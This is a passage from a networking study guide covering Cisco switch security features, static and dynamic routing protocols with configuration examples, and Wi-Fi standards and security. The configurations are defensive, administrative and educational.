
! Verification
Switch# show etherchannel summary
Switch# show etherchannel 1 detail
Switch# show interfaces port-channel 1
```

**Requirements for EtherChannel:**
- Same speed and duplex
- Same VLAN configuration (both access on same VLAN, or both trunk with same VLANs)
- Same STP settings

---

## 4.5 Port Security

Limits which MAC addresses can use a switch port. Mitigates MAC flooding attacks.

```cisco
! Enable port security
Switch(config)# interface fa0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport port-security                 ! Enable
Switch(config-if)# switchport port-security maximum 2       ! Max 2 MACs
Switch(config-if)# switchport port-security mac-address 0011.2233.4455  ! Static MAC
Switch(config-if)# switchport port-security mac-address sticky  ! Learn dynamically and save

! Violation modes:
Switch(config-if)# switchport port-security violation shutdown    ! (default) Err-disable port
Switch(config-if)# switchport port-security violation restrict    ! Drop packets, log
Switch(config-if)# switchport port-security violation protect     ! Drop packets, no log

! Re-enable err-disabled port
Switch(config)# interface fa0/1
Switch(config-if)# shutdown
Switch(config-if)# no shutdown

! Verification
Switch# show port-security
Switch# show port-security interface fa0/1
Switch# show port-security address
```

---

## 4.6 Other Switch Security Features

### DHCP Snooping
Prevents rogue DHCP servers on the network.
- **Trusted ports:** Uplinks to real DHCP servers (allow DHCP offers)
- **Untrusted ports:** All access ports (block DHCP offers/replies)
- Builds DHCP binding table (MAC → IP mapping)

```cisco
Switch(config)# ip dhcp snooping                     ! Enable globally
Switch(config)# ip dhcp snooping vlan 10,20           ! Enable per VLAN
Switch(config)# interface gi0/24                     ! Uplink to DHCP server
Switch(config-if)# ip dhcp snooping trust
Switch# show ip dhcp snooping
Switch# show ip dhcp snooping binding
```

### Dynamic ARP Inspection (DAI)
Uses DHCP snooping binding table to validate ARP packets. Prevents ARP poisoning.

```cisco
Switch(config)# ip arp inspection vlan 10,20
Switch(config)# interface gi0/24
Switch(config-if)# ip arp inspection trust          ! Trust uplink ports
Switch# show ip arp inspection
Switch# show ip arp inspection vlan 10
```

### IP Source Guard (IPSG)
Validates source IP against DHCP snooping binding table. Prevents IP spoofing.

```cisco
Switch(config)# interface fa0/1
Switch(config-if)# ip verify source
Switch# show ip verify source
```

### Storm Control
Limits broadcast, multicast, or unknown unicast storms.

```cisco
Switch(config-if)# storm-control broadcast level 20    ! Alert at 20% of bandwidth
Switch(config-if)# storm-control broadcast level 20 10 ! Shutdown at 20%, restart at 10%
Switch(config-if)# storm-control action shutdown
```

### SPAN (Switched Port Analyzer) — Port Mirroring
Copies traffic from one or more ports to a monitoring port for capture/analysis.

```cisco
! SPAN — local monitoring
Switch(config)# monitor session 1 source interface fa0/1 both     ! Monitor fa0/1 TX+RX
Switch(config)# monitor session 1 destination interface fa0/24   ! Send copy to fa0/24

! RSPAN — remote monitoring (across switches)
Switch(config)# vlan 99
Switch(config-vlan)# remote-span
Switch(config)# monitor session 1 source interface fa0/1
Switch(config)# monitor session 1 destination remote vlan 99

Switch# show monitor session 1
```

---

## 4.7 Switch Stacking

Multiple physical switches act as one logical switch:
- **Cisco StackWise:** Proprietary 80 Gbps ring; up to 9 switches
- **HP IRF (Intelligent Resilient Framework):** Similar concept
- Shared single IP, single management plane, single STP instance
- Benefits: Simplified management, redundancy, increased port density

---
# SECTION 5: Routing — Static, Dynamic, and Protocols

---

## 5.1 Routing Fundamentals

A **router** forwards packets between networks using **routing tables** to determine the best next-hop. Routing is a Layer 3 function.

### Routing Table Components

```
Router# show ip route
Codes: C - connected, S - static, R - RIP, O - OSPF, D - EIGRP
       B - BGP, i - IS-IS, L - local

C   192.168.1.0/24 is directly connected, GigabitEthernet0/0
L   192.168.1.1/32 is directly connected, GigabitEthernet0/0
O   10.0.1.0/24 [110/2] via 10.0.0.2, 00:05:23, GigabitEthernet0/1
S   0.0.0.0/0 [1/0] via 203.0.113.1
```

- **Network/prefix:** Destination
- **[AD/Metric]:** Administrative distance / metric
- **via:** Next-hop IP address
- **Interface:** Outgoing interface

### Route Selection (Longest Prefix Match)

Router always chooses the **most specific route** (longest prefix / highest CIDR number):
```
Destination: 10.1.1.5
Routes available:
  10.0.0.0/8     → less specific
  10.1.0.0/16    → more specific
  10.1.1.0/24    → most specific ← WINS
  0.0.0.0/0      → default (last resort)
```

### Administrative Distance (AD)

When multiple routing sources have routes to the same destination, AD determines trustworthiness. **Lower AD = more trusted, preferred.**

| Source | AD |
|--------|-----|
| Connected | 0 |
| Static | 1 |
| EIGRP Summary | 5 |
| External BGP (eBGP) | 20 |
| EIGRP Internal | 90 |
| IGRP (legacy) | 100 |
| OSPF | 110 |
| IS-IS | 115 |
| RIP | 120 |
| EIGRP External | 170 |
| Internal BGP (iBGP) | 200 |
| Unknown | 255 (never used) |

**Floating static route:** Static route with AD higher than dynamic protocol. Used as backup:
```cisco
ip route 10.0.0.0 255.255.255.0 192.168.1.2 130   ! AD=130, loses to OSPF (110)
```

---

## 5.2 Static Routing

Manually configured routes. Simple, predictable, no overhead. Doesn't adapt to topology changes.

### Types of Static Routes

**Standard static route:**
```cisco
ip route 192.168.2.0 255.255.255.0 10.0.0.2       ! Via next-hop IP
ip route 192.168.2.0 255.255.255.0 GigabitEthernet0/1  ! Via interface (careful with multi-access)
ip route 192.168.2.0 255.255.255.0 10.0.0.2 GigabitEthernet0/1  ! Both (best for point-to-point)
```

**Default route:**
```cisco
ip route 0.0.0.0 0.0.0.0 203.0.113.1              ! Send all unknown traffic here
ip route 0.0.0.0 0.0.0.0 GigabitEthernet0/0        ! Via interface (common on ISP-facing)
```

**Summary route:**
```cisco
ip route 10.0.0.0 255.0.0.0 10.255.255.1          ! Summarizes 10.x.x.x traffic
```

**Host route (/32):**
```cisco
ip route 192.168.1.100 255.255.255.255 10.0.0.2    ! Route to single host
```

**IPv6 static routes:**
```cisco
ipv6 route 2001:db8:1::/64 2001:db8:ff::2
ipv6 route ::/0 2001:db8:ff::1                     ! IPv6 default route
```

### When to Use Static Routing
- Small networks that don't change often
- Stub networks (one path in/out)
- Security (only allow specific routes)
- Reducing routing protocol overhead
- Pointing to ISP (default route)

---

## 5.3 Dynamic Routing Concepts

**Interior Gateway Protocols (IGP):** Used within an Autonomous System (AS)
- RIP, OSPF, EIGRP, IS-IS

**Exterior Gateway Protocols (EGP):** Used between Autonomous Systems
- BGP

**Autonomous System (AS):** A collection of networks under one administrative domain with a common routing policy. Identified by **ASN (Autonomous System Number):**
- 16-bit: 1–65535 (public 1–64511, private 64512–65535)
- 32-bit: Extended ASN space

### Routing Protocol Categories

**Distance-Vector:**
- Each router only knows its neighbors' distances to destinations
- Shares entire routing table with neighbors periodically
- Simple but slower convergence; prone to routing loops
- Uses **split horizon**, **route poisoning**, **holddown timers** to prevent loops
- Examples: RIP, RIPv2, IGRP

**Link-State:**
- Each router knows full topology of the network
- Shares LSAs (Link State Advertisements) describing directly connected links
- Builds topological map using **Dijkstra's SPF algorithm**
- Faster convergence; more complex
- Examples: OSPF, IS-IS

**Path-Vector:**
- Like distance-vector but shares the full path to destinations
- Prevents loops because path is known
- Example: BGP

**Advanced Distance-Vector (Hybrid):**
- Combines features of distance-vector and link-state
- Example: EIGRP — uses DUAL algorithm, fast convergence

---

## 5.4 RIP (Routing Information Protocol)

**RIPv1:** Classful, broadcast updates, no authentication (obsolete)
**RIPv2:** Classless (supports CIDR), multicast updates (224.0.0.9), MD5 authentication

### RIP Characteristics
- Metric: **Hop count** (max 15; 16 = unreachable)
- Administrative Distance: **120**
- Update interval: every **30 seconds**
- **Split horizon:** Don't advertise route back out the interface it was learned on
- **Route poisoning:** When route fails, advertise it with metric 16 (immediately)
- **Holddown timer:** 180 seconds after route marked invalid — ignore updates for that route
- **Flush timer:** 240 seconds — remove route from table if not updated

### RIPv2 Configuration

```cisco
Router(config)# router rip
Router(config-router)# version 2
Router(config-router)# network 192.168.1.0
Router(config-router)# network 10.0.0.0
Router(config-router)# no auto-summary            ! Required for classless
Router(config-router)# passive-interface gi0/0    ! Don't send updates out this interface
Router(config-router)# default-information originate  ! Advertise default route

! Authentication
Router(config)# key chain RIP-KEYS
Router(config-keychain)# key 1
Router(config-keychain-key)# key-string Secr3t
Router(config)# interface gi0/1
Router(config-if)# ip rip authentication mode md5
Router(config-if)# ip rip authentication key-chain RIP-KEYS

Router# show ip rip database
Router# show ip protocols
Router# debug ip rip
```

---

## 5.5 OSPF (Open Shortest Path First)

OSPF is the most widely deployed IGP. It's a **link-state protocol** using **Dijkstra's SPF algorithm**.

### OSPF Characteristics
- Metric: **Cost** (100 Mbps / interface bandwidth; default reference = 100 Mbps)
- Administrative Distance: **110**
- Uses **multicast:** 224.0.0.5 (all OSPF routers), 224.0.0.6 (DR/BDR)
- Protocol number: **89** (directly in IP, not TCP/UDP)
- **Classless:** Supports VLSM and CIDR
- Supports **areas** for scalability

### OSPF Areas

OSPF uses a hierarchical **area** structure to scale:
- **Area 0 (Backbone area):** All other areas must connect here
- **Non-backbone areas:** Areas 1, 2, 3, etc.
- Every inter-area traffic must go through Area 0

**Router types:**
- **IR (Internal Router):** All interfaces in same area
- **ABR (Area Border Router):** Interfaces in multiple areas; connects to backbone
- **ASBR (AS Boundary Router):** Redistributes routes from other routing domains
- **Backbone Router:** Has interface in Area 0

**LSA Types:**
- **Type 1 (Router LSA):** Generated by each router; describes its links
- **Type 2 (Network LSA):** Generated by DR; describes all routers on multi-access segment
- **Type 3 (Summary LSA):** Generated by ABR; inter-area routes
- **Type 4 (ASBR Summary):** Tells other areas where the ASBR is
- **Type 5 (External LSA):** Generated by ASBR; external routes (redistributed)
- **Type 7 (NSSA External):** External routes in NSSA areas

**Area types:**
- **Standard area:** Accepts all LSA types
- **Stub area:** No external LSAs (Type 5); default route from ABR replaces them
- **Totally stubby area:** No Type 3, 4, or 5 LSAs; only default from ABR (Cisco)
- **NSSA (Not-So-Stubby Area):** No Type 5 from backbone; allows local external routes via Type 7

### OSPF Neighbor Formation

OSPF routers form **adjacencies** before exchanging routing information.

**OSPF neighbor states:**
1. **Down:** No Hello received
2. **Attempt:** Sending Hellos (NBMA only)
3. **Init:** Hello received, but our Router ID not in their Hello
4. **2-Way:** Bidirectional — our RID seen in their Hello; DR/BDR election happens here
5. **ExStart:** Master/slave relationship established for DBD exchange
6. **Exchange:** Exchanging DBD (Database Description) packets
7. **Loading:** Requesting missing LSAs with LSRs; receiving LSUs
8. **Full:** Synchronized LSDB — adjacency complete

**Hello packet matching requirements:**
- Same area ID
- Same subnet and mask
- Same Hello and Dead intervals
- Same MTU (optional, can disable check)
- Same authentication
- Same stub area flags

### DR and BDR Election (Multi-access networks)

On Ethernet segments, OSPF elects a **DR (Designated Router)** and **BDR (Backup DR)** to reduce LSA flooding:
- All routers form full adjacency with DR and BDR only (not each other)
- **DROther** routers exchange only to DR/BDR (2-Way with each other)

**DR/BDR election:**
1. Highest **OSPF priority** (0–255, default 1; 0 = never becomes DR/BDR)
2. Highest **Router ID** (tiebreaker)

**OSPF Router ID selection:**
1. Manually configured: `router-id 1.1.1.1`
2. Highest IP on loopback interface
3. Highest IP on active interface

> ⚠️ DR/BDR is non-preemptive — existing DR won't step down if a router with higher priority joins.

### OSPF Cost

Cost = **Reference bandwidth / Interface bandwidth**
- Default reference = 100 Mbps (10^8)
- 100 Mbps FastEthernet: 100M/100M = **1**
- 10 Mbps Ethernet: 100M/10M = **10**
- 1 Gbps: 100M/1000M = **0.1 → rounds to 1** (same as FastEthernet!)

**Fix for Gigabit and above:**
```cisco
Router(config-router)# auto-cost reference-bandwidth 10000   ! 10 Gbps reference
! Now: 1Gbps = 10, 10Gbps = 1
```

**Manual cost:**
```cisco
Router(config-if)# ip ospf cost 50
```

### OSPF Configuration (OSPFv2)

```cisco
! Basic OSPF
Router(config)# router ospf 1                         ! Process ID (local significance only)
Router(config-router)# router-id 1.1.1.1
Router(config-router)# network 192.168.1.0 0.0.0.255 area 0   ! Wildcard mask
Router(config-router)# network 10.0.0.0 0.0.0.3 area 1
Router(config-router)# passive-interface GigabitEthernet0/0   ! Don't send Hellos out this interface

! Change timers
Router(config-if)# ip ospf hello-interval 5
Router(config-if)# ip ospf dead-interval 20

! Authentication
Router(config-if)# ip ospf authentication message-digest
Router(config-if)# ip ospf message-digest-key 1 md5 OsprPassword

! Stub areas
Router(config-router)# area 1 stub
Router(config-router)# area 1 stub no-summary           ! Totally stubby

! Redistribute default route
Router(config-router)# default-information originate     ! Must have a default route
Router(config-router)# default-information originate always  ! Even without default route

! Manual cost on interface
Router(config-if)# ip ospf cost 100

! DR/BDR priority
Router(config-if)# ip ospf priority 255    ! Highest → always DR
Router(config-if)# ip ospf priority 0     ! Never becomes DR

! Verification
Router# show ip ospf
Router# show ip ospf neighbor
Router# show ip ospf neighbor detail
Router# show ip ospf database
Router# show ip ospf interface
Router# show ip ospf interface gi0/0
Router# show ip route ospf
Router# debug ip ospf events
Router# debug ip ospf hello
```

### OSPFv3 (IPv6)

```cisco
! IPv6 OSPF
Router(config)# ipv6 unicast-routing
Router(config)# ipv6 router ospf 1
Router(config-rtr)# router-id 1.1.1.1

Router(config)# interface gi0/0
Router(config-if)# ipv6 ospf 1 area 0         ! Enable OSPF on interface directly

Router# show ipv6 ospf neighbor
Router# show ipv6 route ospf
```

---

## 5.6 EIGRP (Enhanced Interior Gateway Routing Protocol)

Cisco proprietary **hybrid** routing protocol (advanced distance-vector / diffusing update). Very fast convergence.

### EIGRP Characteristics
- Metric: **Composite metric** (bandwidth + delay by default; can add reliability, load, MTU)
- Administrative Distance: **90** (internal), **170** (external)
- Uses **multicast:** 224.0.0.10
- Protocol number: **88**
- **Classless:** Supports VLSM and CIDR
- Supports unequal-cost load balancing (variance)
- Uses **DUAL (Diffusing Update Algorithm)** for loop-free paths

### EIGRP Terminology

- **Reported Distance (RD) / Advertised Distance:** Neighbor's metric to the destination
- **Feasible Distance (FD):** Best metric from this router to destination
- **Successor:** Best route to destination (in routing table)
- **Feasible Successor (FS):** Backup route (in topology table); must satisfy feasibility condition
- **Feasibility Condition:** RD < FD of current successor (guarantees loop-free alternate path)

### EIGRP Metric Calculation

Default metric = (10^7 / BW) + (Delay/10) × 256
- **BW:** Lowest bandwidth on path (Kbps)
- **Delay:** Sum of delays on path (tens of microseconds)

### EIGRP Configuration

```cisco
! Classic EIGRP
Router(config)# router eigrp 100                    ! AS number — must match neighbors
Router(config-router)# network 192.168.1.0 0.0.0.255
Router(config-router)# network 10.0.0.0 0.0.0.255
Router(config-router)# no auto-summary
Router(config-router)# passive-interface gi0/0
Router(config-router)# eigrp router-id 1.1.1.1

! Authentication
Router(config)# key chain EIGRP-KEYS
Router(config-keychain)# key 1
Router(config-keychain-key)# key-string Secr3t
Router(config)# interface gi0/1
Router(config-if)# ip authentication mode eigrp 100 md5
Router(config-if)# ip authentication key-chain eigrp 100 EIGRP-KEYS

! Unequal-cost load balancing
Router(config-router)# variance 2                   ! Use routes up to 2x the FD

! Summarization
Router(config-if)# ip summary-address eigrp 100 10.0.0.0 255.0.0.0

! Verification
Router# show ip eigrp neighbors
Router# show ip eigrp topology
Router# show ip eigrp topology all-links
Router# show ip eigrp traffic
Router# show ip route eigrp
Router# debug eigrp packets
```

### Named EIGRP (Modern syntax)

```cisco
Router(config)# router eigrp MYCOMPANY
Router(config-router)# address-family ipv4 autonomous-system 100
Router(config-router-af)# network 192.168.1.0
Router(config-router-af)# eigrp router-id 1.1.1.1
Router(config-router-af)# af-interface GigabitEthernet0/0
Router(config-router-af-interface)# passive-interface
```

---

## 5.7 BGP (Border Gateway Protocol)

**BGP** is the routing protocol of the internet. It routes traffic between **Autonomous Systems (AS)**.

### BGP Types

**eBGP (External BGP):** Between routers in different ASes
- Default AD: 20
- TTL of BGP packets = 1 (must be directly connected, unless multihop configured)
- Next-hop changes when advertising to eBGP peers

**iBGP (Internal BGP):** Between routers in the same AS
- Default AD: 200
- Next-hop unchanged when advertising within AS
- **Full-mesh requirement:** Every iBGP router must peer with every other (or use route reflectors)

### BGP Characteristics
- Uses **TCP port 179** for peer sessions
- **Path-vector** protocol — shares full path (AS_PATH attribute)
- Not a metric-based routing protocol — uses **path attributes** for best path selection
- Slow convergence by design (prevents instability)

### BGP Path Attributes

BGP uses attributes to select best path. **WEIGHT** (highest) through **ROUTER ID** (lowest):

| # | Attribute | Prefer | Scope |
|---|-----------|--------|-------|
| 1 | WEIGHT | Highest | Cisco, local only |
| 2 | LOCAL_PREF | Highest | iBGP, AS-wide |
| 3 | Locally originated | — | Prefer locally injected |
| 4 | AS_PATH | Shortest | Prefer fewer AS hops |
| 5 | ORIGIN | Lowest | i < e < ? |
| 6 | MED | Lowest | Suggest entry point to neighbors |
| 7 | eBGP over iBGP | eBGP preferred | — |
| 8 | IGP metric to next-hop | Lowest | — |
| 9 | Oldest eBGP path | — | Stability |
| 10 | Neighbor BGP Router ID | Lowest | — |
| 11 | Neighbor IP address | Lowest | Last tiebreaker |

**Mnemonic:** "We Love Oranges AS Oranges Mean Pure Refreshment" (Weight, Local-pref, Originate, AS-path, Origin, MED, Paths-eBGP, Router-id)

### BGP Configuration

```cisco
! Basic eBGP
Router(config)# router bgp 65001                    ! Local AS number
Router(config-router)# bgp router-id 1.1.1.1
Router(config-router)# neighbor 203.0.113.2 remote-as 65002    ! eBGP peer
Router(config-router)# network 192.168.0.0 mask 255.255.255.0  ! Advertise network

! Basic iBGP
Router(config-router)# neighbor 10.0.0.2 remote-as 65001       ! iBGP peer (same AS)
Router(config-router)# neighbor 10.0.0.2 update-source Loopback0

! Route Reflector (avoids iBGP full mesh)
Router(config-router)# neighbor 10.0.0.2 route-reflector-client

! Path attribute manipulation
Router(config-router)# neighbor 203.0.113.2 weight 200         ! Prefer this neighbor
Router(config-router)# bgp default local-preference 200        ! Prefer this AS for outbound

! Authentication (MD5)
Router(config-router)# neighbor 203.0.113.2 password BGP-Secret

! Verification
Router# show bgp summary
Router# show bgp ipv4 unicast
Router# show bgp ipv4 unicast 192.168.0.0
Router# show bgp neighbors
Router# show bgp neighbors 203.0.113.2 advertised-routes
Router# show bgp neighbors 203.0.113.2 received-routes
```

---

## 5.8 Route Redistribution

Moving routes between different routing protocols.

```cisco
! Redistribute OSPF into EIGRP
Router(config)# router eigrp 100
Router(config-router)# redistribute ospf 1 metric 10000 100 255 1 1500
!                                          BW     delay rel load MTU

! Redistribute EIGRP into OSPF
Router(config)# router ospf 1
Router(config-router)# redistribute eigrp 100 subnets metric 20 metric-type e2

! Redistribute static routes into OSPF
Router(config)# router ospf 1
Router(config-router)# redistribute static subnets

! Redistribute connected networks
Router(config-router)# redistribute connected subnets
```

---

## 5.9 Policy-Based Routing (PBR)

Route packets based on criteria other than destination IP (source IP, protocol, port, size).

```cisco
! Route web traffic via ISP1, everything else via ISP2
Router(config)# access-list 101 permit tcp any any eq 80
Router(config)# route-map PBR-WEB permit 10
Router(config-route-map)# match ip address 101
Router(config-route-map)# set ip next-hop 203.0.113.1      ! ISP1

Router(config)# interface gi0/0                            ! Apply to incoming interface
Router(config-if)# ip policy route-map PBR-WEB

Router# show route-map
Router# debug ip policy
```

---

## 5.10 First Hop Redundancy Protocols (FHRP)

Provides redundant default gateway for hosts. If the primary gateway fails, a backup takes over transparently.

### HSRP (Hot Standby Router Protocol) — Cisco Proprietary

- **Virtual IP and MAC** shared between active and standby routers
- **Active router:** Handles all traffic; highest priority wins (default 100)
- **Standby router:** Monitors active; takes over on failure
- Uses **UDP 1985** (v1) or multicast 224.0.0.2 (v1) / 224.0.0.102 (v2)
- **Hello timer:** 3 seconds | **Hold timer:** 10 seconds

```cisco
! Router 1 (active)
Router1(config)# interface gi0/0
Router1(config-if)# ip address 192.168.1.2 255.255.255.0
Router1(config-if)# standby 1 ip 192.168.1.1              ! Virtual IP
Router1(config-if)# standby 1 priority 110                 ! Higher than default (100)
Router1(config-if)# standby 1 preempt                      ! Take over if higher priority

! Router 2 (standby)
Router2(config)# interface gi0/0
Router2(config-if)# ip address 192.168.1.3 255.255.255.0
Router2(config-if)# standby 1 ip 192.168.1.1

Router# show standby
Router# show standby brief
```

**HSRP v1 vs v2:**
- v2 supports IPv6, more groups, millisecond timers
- v2 uses multicast 224.0.0.102

### VRRP (Virtual Router Redundancy Protocol) — IEEE 802.118

- Open standard (like HSRP but vendor-neutral)
- **Master** (highest priority) + **Backup** routers
- The master router owns the real IP — it also serves as virtual IP
- **Preemption enabled by default**
- Uses multicast 224.0.0.18
- Supports millisecond timers

```cisco
Router(config-if)# vrrp 1 ip 192.168.1.1
Router(config-if)# vrrp 1 priority 200
```

### GLBP (Gateway Load Balancing Protocol) — Cisco Proprietary

- Adds **load balancing** to gateway redundancy
- All routers in group can actively forward traffic (unlike HSRP/VRRP)
- **AVG (Active Virtual Gateway):** Manages virtual MAC assignments
- **AVF (Active Virtual Forwarder):** Each router forwards some traffic
- **Weighted, round-robin, or host-dependent** load balancing

```cisco
Router(config-if)# glbp 1 ip 192.168.1.1
Router(config-if)# glbp 1 priority 150
Router(config-if)# glbp 1 preempt
Router(config-if)# glbp 1 load-balancing round-robin
Router# show glbp
```

---
# SECTION 6: Wireless Networking

---

## 6.1 Wireless Fundamentals

Wireless networking transmits data using **radio frequency (RF)** signals instead of physical cables. RF signals propagate through air (and other media) as electromagnetic waves.

### Key RF Concepts

**Frequency:** Number of cycles per second (Hz). Higher frequency = more data capacity but shorter range.

**Wavelength:** Physical length of one cycle. Wavelength = Speed of light / Frequency. Lower frequency = longer wavelength = better penetration through walls.

**Amplitude:** Signal strength. Measured in decibels (dB).

**dB (Decibel) math:**
- +3 dB = double the power
- -3 dB = half the power
- +10 dB = 10× the power
- -10 dB = 1/10th the power
- 0 dBm = 1 milliwatt reference

**dBm:** Power relative to 1 milliwatt
- Typical AP transmit power: 20 dBm (100 mW)
- Typical receive sensitivity: -70 to -90 dBm

**RSSI (Received Signal Strength Indicator):** Measured in negative dBm
- -30 dBm: Excellent (very close to AP)
- -50 dBm: Great
- -60 dBm: Good
- -70 dBm: Fair (minimum for reliable connection)
- -80 dBm: Poor (streaming problems)
- -90 dBm: Unusable

**SNR (Signal-to-Noise Ratio):** Difference between signal and noise floor
- > 40 dB: Excellent
- 25-40 dB: Good
- 15-25 dB: Low — may cause issues
- < 15 dB: Very poor

### Wireless Signal Issues

**Attenuation:** Signal weakens with distance (free space path loss).

**Interference:** Other RF sources degrading signal:
- Other 2.4 GHz devices: microwaves, Bluetooth, cordless phones
- Adjacent channel interference (overlapping Wi-Fi channels)
- Co-channel interference (same channel, different AP)

**Multipath:** Signal reflects off walls/objects and arrives at receiver at different times.
- Can cause signal cancellation (destructive interference) or amplification
- MIMO uses multipath beneficially

**Hidden node problem:** Two stations can't hear each other but both transmit to same AP → collisions. Solved by RTS/CTS.

**Near/far problem:** Nearby device drowns out signal from distant device.

**Absorption:** Materials absorb RF energy:
- Concrete/brick: High absorption
- Drywall: Low absorption
- Metal: Reflects (worst — creates dead zones)
- Water (humans, aquariums): High absorption
- Glass: Low absorption

---

## 6.2 Wi-Fi Standards (IEEE 802.11)

### IEEE 802.11 Standards Comparison

| Standard | Wi-Fi Gen | Year | Max Speed | Frequency | Notes |
|----------|-----------|------|-----------|-----------|-------|
| 802.11 | — | 1997 | 2 Mbps | 2.4 GHz | Original |
| 802.11a | — | 1999 | 54 Mbps | 5 GHz | OFDM; short range |
| 802.11b | — | 1999 | 11 Mbps | 2.4 GHz | DSSS; popular but slow |
| 802.11g | — | 2003 | 54 Mbps | 2.4 GHz | OFDM; backward compatible |
| 802.11n | Wi-Fi 4 | 2009 | 600 Mbps | 2.4/5 GHz | MIMO; channel bonding |
| 802.11ac | Wi-Fi 5 | 2013 | 3.5 Gbps | 5 GHz only | MU-MIMO; 160 MHz channels |
| 802.11ax | Wi-Fi 6 | 2019 | 9.6 Gbps | 2.4/5 GHz | OFDMA; BSS Coloring; TWT |
| 802.11ax | Wi-Fi 6E | 2021 | 9.6 Gbps | 2.4/5/6 GHz | Adds 6 GHz band |
| 802.11be | Wi-Fi 7 | 2024 | 46 Gbps | 2.4/5/6 GHz | Multi-link; 320 MHz |

### Modulation and Encoding Techniques

**DSSS (Direct Sequence Spread Spectrum):** Used by 802.11b. Spreads signal over wider band.

**OFDM (Orthogonal Frequency Division Multiplexing):** Used by 802.11a/g/n/ac. Splits channel into many subcarriers — efficient, handles multipath well.

**OFDMA (Orthogonal Frequency Division Multiple Access):** Used by 802.11ax (Wi-Fi 6). Multiple users share subcarriers simultaneously — better efficiency in dense environments.

**MIMO (Multiple Input Multiple Output):** Multiple antennas for transmit and receive — improves throughput and reliability using multipath.
- 802.11n: Up to 4×4 MIMO
- 802.11ac: MU-MIMO (downlink only) up to 4 clients
- 802.11ax: MU-MIMO (uplink and downlink) up to 8 clients

**MRC (Maximal Ratio Combining):** Receiver combines multipath signals constructively.

**Beamforming:** Focus RF energy toward specific client rather than radiating equally in all directions.

### Wireless Channels

#### 2.4 GHz Band

- Channels 1–14 (region-dependent; US = 1–11)
- Each channel is 22 MHz wide; 5 MHz separation between channels
- **Non-overlapping channels (US): 1, 6, 11**
- Only 3 non-overlapping channels — congested in dense areas

```
Ch 1:  |----|
Ch 6:       |----|
Ch 11:           |----|
```

#### 5 GHz Band

- 24+ non-overlapping 20 MHz channels (US)
- Channels: 36, 40, 44, 48 (UNII-1), 52, 56, 60, 64 (UNII-2), 100–144 (UNII-2e), 149–165 (UNII-3)
- More channels = less congestion
- **DFS (Dynamic Frequency Selection):** Required on channels 52–144 — must detect radar and switch channels
- **TPC (Transmit Power Control):** Adjust power to avoid interference with radar

#### 6 GHz Band (Wi-Fi 6E)

- 59 additional 20 MHz channels
- No legacy devices (Wi-Fi 6E only)
- No DFS required
- Less interference; more capacity

#### Channel Bonding

Combine adjacent channels for higher throughput:
- **40 MHz:** Bonds 2×20 MHz channels (doubles throughput; primary + secondary channel)
- **80 MHz:** Bonds 4×20 MHz (802.11ac and later)
- **160 MHz:** Bonds 8×20 MHz (802.11ac Wave 2, 802.11ax)
- Wider channels = higher throughput but more interference risk

### 2.4 GHz vs 5 GHz vs 6 GHz

| Feature | 2.4 GHz | 5 GHz | 6 GHz |
|---------|---------|-------|-------|
| Range | Longer | Shorter | Shorter |
| Wall penetration | Better | Worse | Worse |
| Congestion | High | Lower | Very low (new) |
| Non-overlapping channels | 3 | 24+ | 59+ |
| Max speed (theoretical) | 600 Mbps | 9.6 Gbps | 9.6 Gbps |
| Backward compatibility | All devices | n/a | Wi-Fi 6E only |

---

## 6.3 Wireless Topologies and Modes

### BSS (Basic Service Set)
- Single AP + clients
- **BSSID:** AP's MAC address (identifies the BSS)
- **SSID:** Service Set Identifier — the network name

### ESS (Extended Service Set)
- Multiple APs with **same SSID** — roaming network
- Each AP has unique BSSID but same SSID
- **Roaming:** Client moves between APs seamlessly
- **Fast BSS Transition (802.11r):** Speeds up roaming
- **802.11k:** Radio Resource Management — clients can find better APs
- **802.11v:** BSS Transition Management — AP can suggest clients move

### IBSS / Ad-hoc
- No AP — peer-to-peer wireless
- Limited range and performance
- Used for: temporary networks, direct file transfer

### Mesh Networking
- APs communicate wirelessly to each other (backhaul)
- One or more APs connect to wired network (root/gateway AP)
- Self-configuring, self-healing
- Used in: homes (Eero, Google Nest), outdoor coverage areas

### Wireless Bridge
- Connect two wired network segments wirelessly
- Point-to-point: Two APs in bridge mode
- Point-to-multipoint: One root bridge, multiple non-root bridges

---

## 6.4 Wireless Security

### Historical Security (DO NOT USE)

**WEP (Wired Equivalent Privacy):**
- Uses RC4 stream cipher with 40-bit or 104-bit key
- Critically flawed — IV (Initialization Vector) only 24 bits, reused frequently
- Can be cracked in minutes with tools like aircrack-ng
- **AVOID** — completely broken

**WPA (Wi-Fi Protected Access):**
- Introduced as interim fix for WEP
- Uses **TKIP (Temporal Key Integrity Protocol)** — still RC4 but with per-packet key mixing
- Better than WEP but TKIP also has weaknesses
- **AVOID** — deprecated

### Current Security Standards

**WPA2 (802.11i) — Current minimum standard:**
- Uses **CCMP (Counter Mode with CBC-MAC Protocol)** — AES-128
- Much stronger than WPA/TKIP
- Two modes:
  - **Personal (PSK):** Pre-Shared Key — passphrase hashed with SSID
  - **Enterprise (802.1X):** RADIUS server authentication

**WPA3 — Current recommended standard:**
- Mandatory for Wi-Fi 6 (802.11ax) certification
- **SAE (Simultaneous Authentication of Equals):** Replaces PSK — prevents offline dictionary attacks
  - Forward secrecy — old sessions can't be decrypted even if password is compromised
- **192-bit security mode:** For enterprise/government
- **OWE (Opportunistic Wireless Encryption):** Encrypts open networks (no password but encrypted)
- **Easy Connect (DPP):** QR code device provisioning for IoT

### 802.1X / EAP — Enterprise Authentication

**802.1X:** Port-based Network Access Control (PNAC)
- Three components:
  - **Supplicant:** Client device seeking access
  - **Authenticator:** AP or switch (forwards credentials)
  - **Authentication Server:** RADIUS server (validates credentials)

**EAP (Extensible Authentication Protocol):** Authentication framework used within 802.1X

| EAP Method | Client Certificate | Server Certificate | Notes |
|-----------|-------------------|-------------------|-------|
| EAP-TLS | Required | Required | Most secure; requires client cert PKI |
| PEAP | Not required | Required | Password inside TLS tunnel |
| EAP-TTLS | Not required | Required | Like PEAP but more flexible |
| EAP-FAST | Not required | Optional | Cisco; PAC-based |
| LEAP | Not required | Not required | Cisco; broken — avoid |
| EAP-MD5 | Not required | Not required | No encryption; avoid |

**RADIUS for Wi-Fi:**
- AP sends auth request to RADIUS server (UDP 1812/1813)
- RADIUS validates credentials (against AD, LDAP, local DB)
- RADIUS sends Access-Accept or Access-Reject
- **802.1X four-way handshake** then establishes encryption keys

### Four-Way Handshake (WPA2/WPA3)

After 802.1X or PSK authentication, the **four-way handshake** establishes encryption keys:

```
AP                              Client
 |--- EAPOL Key (ANonce) -------->|   AP sends random nonce
 |<-- EAPOL Key (SNonce, MIC) ----|   Client sends nonce + MIC
